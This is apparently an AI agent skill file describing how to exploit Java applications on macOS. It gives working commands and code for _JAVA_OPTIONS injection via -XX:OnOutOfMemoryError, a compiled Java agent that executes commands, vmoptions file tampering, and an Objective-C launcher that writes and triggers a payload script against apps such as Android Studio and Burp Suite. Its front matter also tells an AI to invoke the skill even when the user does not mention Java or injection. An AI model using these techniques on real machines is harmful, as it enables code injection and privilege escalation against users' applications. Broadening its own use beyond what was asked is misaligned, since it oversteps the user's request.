---
name: macos-java-injection
description: macOS Java application security testing and exploitation. Use this skill whenever the user mentions Java applications on macOS, _JAVA_OPTIONS, vmoptions files, Java agents, or wants to test for privilege escalation through Java apps. This includes finding Java apps, injecting parameters, creating Java agents, and exploiting vmoptions configuration files. Make sure to use this skill for any macOS security testing involving Java applications, even if the user doesn't explicitly mention 'Java' or 'injection'.
---

# macOS Java Applications Injection

A skill for testing and exploiting Java application vulnerabilities on macOS systems.

## Overview

Java applications on macOS can be vulnerable to several attack vectors:
- Environment variable injection via `_JAVA_OPTIONS`
- Java agent injection
- vmoptions file manipulation
- Info.plist parameter extraction

## Enumeration

### Find Java Applications

Search for Java applications by looking for `java.` strings in Info.plist files:

```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full system search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```

### Check for vmoptions Files

Some Java apps load vmoptions files from multiple locations. Monitor file access to find them:

```bash
# Monitor vmoptions file access
sudo eslogger lookup | grep vmoption

# Launch the Java app to see which files it loads
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
```

Common vmoptions locations:
- `/Applications/<App>.app/Contents/bin/<app>.vmoptions`
- `/Applications/<App>.app.vmoptions`
- `~/Library/Application Support/<Vendor>/<App>/<app>.vmoptions`

## _JAVA_OPTIONS Injection

The `_JAVA_OPTIONS` environment variable allows injecting arbitrary Java parameters into any Java application execution.

### Basic Injection

```bash
# Set the environment variable
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'

# Launch the Java application
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```

### Using open Command

```bash
open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```

### Java Agent Injection (Stealthier)

Creating a Java agent is more stealthy than triggering OOM errors:

1. **Create the agent Java file:**

```java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
  public static void premain(String args, Instrumentation inst) {
    try {
      String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
      Runtime.getRuntime().exec(commands);
    }
    catch (Exception err) {
      err.printStackTrace();
    }
  }
}
```

2. **Create manifest.txt:**

```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```

3. **Compile and package:**

```bash
javac Agent.java
jar cvfm Agent.jar manifest.txt Agent.class
```

4. **Inject the agent:**

```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```

> **Important:** The Java agent must be compiled with the same Java version as the target application, or both the agent and application may crash.

## vmoptions File Exploitation

vmoptions files support Java parameter specification and can include other files via the `include` directive.

### Exploitation Techniques

1. **Modify existing vmoptions files** to add malicious parameters
2. **Create new vmoptions files** in writable locations (e.g., `/Applications/<App>.app.vmoptions`)
3. **Use include directive** to load additional configuration files
4. **Inject command execution** via Java parameters like `-XX:OnOutOfMemoryError`

### Example: Android Studio vmoptions

Android Studio loads multiple vmoptions files:
- `/Applications/Android Studio.app/Contents/bin/studio.vmoptions`
- `/Applications/Android Studio.app.vmoptions` (writable by admin group)
- `~/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions`

## Launching Java Apps as New Process

To execute a Java app as a new process (not as a child of the current terminal), use Objective-C:

```objectivec
#import <Foundation/Foundation.h>

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        NSString *filePath = @"/tmp/payload.sh";
        NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";
        
        [content writeToFile:filePath atomically:YES encoding:NSUTF8StringEncoding error:nil];
        
        NSTask *task = [[NSTask alloc] init];
        [task setLaunchPath:@"/usr/bin/open"];
        [task setArguments:@[@"/Applications/Android Studio.app"]];
        
        NSDictionary *customEnvironment = @{
            @"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
        };
        
        NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
        [environment addEntriesFromDictionary:customEnvironment];
        [task setEnvironment:environment];
        
        [task launch];
    }
    return 0;
}
```

Compile with:
```bash
clang -fobjc-arc -framework Foundation invoker.m -o invoker
```

## Best Practices

1. **Always enumerate first** - Find all Java applications before attempting exploitation
2. **Check Java versions** - Ensure agent compatibility with target application
3. **Test in safe environments** - These techniques can crash applications
4. **Document findings** - Track which applications are vulnerable and how
5. **Consider defensive implications** - These same techniques help identify misconfigurations

## Common Targets

- Burp Suite Professional
- Android Studio
- IntelliJ IDEA
- Eclipse
- Any application with `JavaApplicationStub` in its bundle

## Limitations

- Requires write access to vmoptions files or ability to set environment variables
- Java agent must match target application's Java version
- Some applications may have protections against these techniques
- May require elevated privileges for certain file modifications
